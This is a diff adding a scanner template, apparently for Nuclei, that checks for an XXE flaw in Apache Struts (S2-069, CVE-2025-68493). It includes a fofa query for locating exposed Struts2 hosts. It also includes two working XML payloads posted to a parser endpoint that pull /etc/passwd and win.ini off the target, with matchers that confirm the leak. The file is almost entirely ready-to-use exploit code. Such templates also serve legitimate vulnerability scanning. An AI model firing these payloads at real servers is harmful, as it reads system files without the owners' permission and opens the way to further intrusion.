@@ -1,0 +1,97 @@
+id: apache-struts-s2-069-xxe-1
+
+info:
+  name: Apache Struts S2-069 XML实体注入漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="Struts2"
+        Apache Struts 2.0.0-2.3.37、2.5.0-2.5.33及6.0.0-6.1.0版本在XML解析过程中存在实体验证缺陷，攻击者可利用恶意构造的XML实体实施注入攻击。该安全问题源于框架未对输入XML的实体声明进行严格校验，从而允许加载外部实体资源。
+  reference:
+  - CVE-2025-68493
+  tags: Apache,Struts
+
+http:
+  # ---------- Linux /etc/passwd 探测 ----------
+  - raw:
+      - |
+        POST /struts2-xml-parser/xmlParserNoDtdParse HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Accept: */*
+
+        <?xml version="1.0"?>
+        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <root>&xxe;</root>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "(?m)^root:[^:\r\n]+:[0-9]+:[0-9]+:"
+
+      - type: regex
+        part: body
+        regex:
+          - "(?m)^(?:daemon|bin|sys|nobody):[^:\r\n]+:[0-9]+:[0-9]+:"
+
+      - type: word
+        part: body
+        words:
+          - "Whitelabel Error Page"
+          - "HTTP Status 404"
+          - "HTTP Status 500"
+          - "HTTP Status 500 – Internal Server Error"
+          - "<title>404 Not Found</title>"
+          - "nginx/"
+          - "Apache Tomcat/"
+        condition: or
+        negative: true
+
+  # ---------- Windows win.ini 探测 ----------
+  - raw:
+      - |
+        POST /struts2-xml-parser/xmlParserNoDtdParse HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Accept: */*
+
+        <?xml version="1.0"?>
+        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+        <root>&xxe;</root>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+
+      - type: word
+        part: body
+        words:
+          - "Whitelabel Error Page"
+          - "HTTP Status 404"
+          - "HTTP Status 500"
+          - "HTTP Status 500 – Internal Server Error"
+          - "<title>404 Not Found</title>"
+          - "nginx/"
+          - "Apache Tomcat/"
+        condition: or
+        negative: true
